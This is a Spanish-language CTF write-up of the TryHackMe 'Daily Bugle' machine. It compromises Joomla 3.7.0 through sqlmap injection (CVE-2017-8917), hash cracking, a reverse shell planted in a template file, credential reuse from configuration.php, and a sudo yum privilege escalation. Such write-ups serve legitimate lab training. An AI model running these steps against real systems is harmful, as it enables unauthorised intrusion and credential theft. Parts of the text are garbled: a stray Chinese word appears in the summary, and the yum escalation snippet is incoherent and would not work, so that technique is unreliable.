# 🖥️ THM: Daily Bugle

## Metadatos

| Campo | Valor |
|-------|-------|
| **Máquina** | Daily Bugle |
| **Plataforma** | TryHackMe |
| **Dificultad** | Medium |
| **Categoría** | Linux / Web / Joomla |
| **IP** | 10.10.x.x |
| **OS** | Linux |
| **Fecha** | 2024 |
| **Tiempo** | 90 min |

---

## 🎯 Resumen Ejecutivo

> Exploté **Joomla 3.7.0** (CVE-2017-8917) para SQL Injection, obtuve credenciales de admin, subí webshell, y escalé via **Joomla配置** para obtener root.

---

## 🔍 Reconocimiento

### Nmap Scan

```bash
nmap -sV -sC -p- -oN nmap_dailybugle.txt 10.10.x.x
```

| Puerto | Servicio | Versión | Estado |
|--------|----------|---------|--------|
| 22 | SSH | OpenSSH 7.4 | Open |
| 80 | HTTP | Apache 2.4.26 | Open |

### Web Enumeration

```bash
# Detectar Joomla
whatweb 10.10.x.x
# Joomla 3.7.0

# Enumerar componentes
joomscan -u http://10.10.x.x

# Buscar directorios
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirb/common.txt
```

**Hallazgos:**
- Joomla 3.7.0 detectado
- Componente `com_fields` vulnerable
- `/administrator` accesible

---

## 💥 Explotación

### SQL Injection en com_fields

**CVE:** CVE-2017-8917
**Ubicación:** `/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml`

```bash
# Payload SQLi
sqlmap -u "http://10.10.x.x/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 -p list[fullordering] --dbs

# Extraer usuarios
sqlmap -u "http://10.10.x.x/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -D joomla -T #__users -C name,password --dump
```

**Resultado:**
```
+-----------+--------------------------------------------------------------+
| name      | password                                                     |
+-----------+--------------------------------------------------------------+
| jonah     | $2y$10$... (bcrypt hash)                                    |
+-----------+--------------------------------------------------------------+
```

### Crackear Hash

```bash
# Usar hashcat o john
hashcat -m 3200 hash.txt rockyou.txt
# Password: spiderman123
```

### Acceso Admin Joomla

```bash
# Login en /administrator
# User: jonah
# Pass: spiderman123

# Subir webshell via Template Manager
# Extensions > Templates > Templates > beez3 > Error.php
# Insertar PHP reverse shell
```

### Shell Inicial

```bash
# Activar webshell
curl http://10.10.x.x/templates/beez3/error.php

# Reverse shell recibida
$ id
uid=48(www-data) gid=48(www-data) groups=48(www-data)
```

---

## 🚀 Escalada de Privilegios

### Enumeración

```bash
# Buscar archivos sensibles
find / -name "*.conf" -o -name "*.cfg" 2>/dev/null
cat /var/www/html/configuration.php
```

**Resultado:**
```php
$password = 'nv5uz9r3ZEDfVgYr';
```

### Root

```bash
# Probar password en MySQL
mysql -u root -p'nv5uz9r3ZEDfVgYr'

# O probar en sudo
sudo -l
# (ALL) NOPASSWD: /usr/bin/yum

# Explotar yum para root
TF=$(mktemp)
echo 'defsystem() {>/dev/null;}; defsystem; /bin/bash' > $TF
sudo /usr/bin/yum --installroot=/tmp install exploit
```

---

## 🏁 Flags

| Flag | Valor | Ubicación |
|------|-------|-----------|
| **User** | `FLAG{...}` | `/home/www-data/user.txt` |
| **Root** | `FLAG{...}` | `/root/root.txt` |

---

## 🛡️ Lecciones Aprendidas

### ✅ Lo que funcionó
- Joomla tiene herramientas de enumeración específicas
- SQL Injection en com_fields es bien documentado
- Credenciales de DB en configuration.php son explotables

### 🔄 Qué haría diferente
- Buscar credenciales en archivos de configuración inmediatamente
- Usar Joomla-specific exploits primero

---

*Writeup creado para CDPN — Nivel Medio*
